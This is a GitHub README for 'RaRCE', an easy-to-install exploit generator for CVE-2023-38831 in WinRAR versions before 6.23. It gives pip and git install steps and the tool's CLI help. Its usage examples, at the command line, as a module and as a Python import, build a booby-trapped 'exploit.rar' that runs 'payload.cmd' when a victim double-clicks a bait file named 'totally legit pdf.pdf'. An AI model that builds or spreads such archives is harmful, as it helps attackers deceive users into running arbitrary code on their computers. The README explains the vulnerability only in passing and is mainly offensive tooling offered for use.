
## RaRCE, Exploit generator for CVE-2023-38831

[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
![GitHub](https://img.shields.io/github/license/ignis-sec/CVE-2023-38831-RaRCE?style=for-the-badge)


This is an easy to install and easy to use, versatile exploit generator for [CVE-2023-38831](https://nvd.nist.gov/vuln/detail/CVE-2023-38831), a vulnerability that affects WinRAR versions before 6.23.


> RARLabs WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive. The issue occurs because a ZIP archive may include a benign file (such as an ordinary .JPG file) and also a folder that has the same name as the benign file, and the contents of the folder (which may include executable content) are processed during an attempt to access only the benign file. This was exploited in the wild in April through August 2023.


## How to install

### Using pip

You can install the tool easily via pip.
```bash
pip install rarce
```

Or, you can use it from the source code.

```bash
git clone https://github.com/ignis-sec/CVE-2023-38831-RaRCE
cd CVE-2023-38831-RaRCE
python3 setup.py install
```


## How to use

```
usage: rarce [-h] [-v] [-i] [-dt] [-pt PRESERVE_TEMP] bait switch output

Exploit generator for CVE-2023-38831

positional arguments:
  bait                  Path to the bait file to to add to the archive.
  switch                Path to the payload to switcheroo with the bait file on double click.
  output                Path to the output file.

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Verbose output.
  -i, --ignore-path-check
                        Ignore path validity check. If given, rarce can overwrite existing files given in output parameter, and can create missing folders for
                        output path.
  -dt, --dont-use-tempdir
                        Prevent the tool from creating a temporary directory when creating the exploit. Instead, create the intermediate folders in current
                        working directory.
  -pt PRESERVE_TEMP, --preserve-temp PRESERVE_TEMP
                        Preserve the temporary directory after creating the exploit. Has no effect if -dt or --dont-use-tempdir is not specified.
```

After installing via pip or setup.py, you can use this tool from the command line. Following command will create the exploit file for you. When a user double clicks the bait file, the payload script or executable will run instead.

```bash
$ rarce "totally legit pdf.pdf" "payload.cmd" "exploit.rar"
```

Optionally, you can use it as a runnable module.

```bash
python -m rarce "totally legit pdf.pdf" "payload.cmd" "exploit.rar"
```

You can also use it within your existing code.

```python
from rarce import exploit

exploit("totally legit pdf.pdf", "payload.cmd", "exploit.rar")
```


[contributors-shield]: https://img.shields.io/github/contributors/ignis-sec/CVE-2023-38831-RaRCE.svg?style=for-the-badge
[contributors-url]: https://github.com/ignis-sec/CVE-2023-38831-RaRCE/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/ignis-sec/CVE-2023-38831-RaRCE.svg?style=for-the-badge
[forks-url]: https://github.com/ignis-sec/CVE-2023-38831-RaRCE/network/members
[stars-shield]: https://img.shields.io/github/stars/ignis-sec/CVE-2023-38831-RaRCE.svg?style=for-the-badge
[stars-url]: https://github.com/ignis-sec/CVE-2023-38831-RaRCE/stargazers
[issues-shield]: https://img.shields.io/github/issues/ignis-sec/CVE-2023-38831-RaRCE.svg?style=for-the-badge
[issues-url]: https://github.com/ignis-sec/CVE-2023-38831-RaRCE/issues
[license-shield]: https://img.shields.io/github/license/ignis-sec/CVE-2023-38831-RaRCE.svg?style=for-the-badge
[license-url]: https://github.com/ignis-sec/CVE-2023-38831-RaRCE/LICENSE
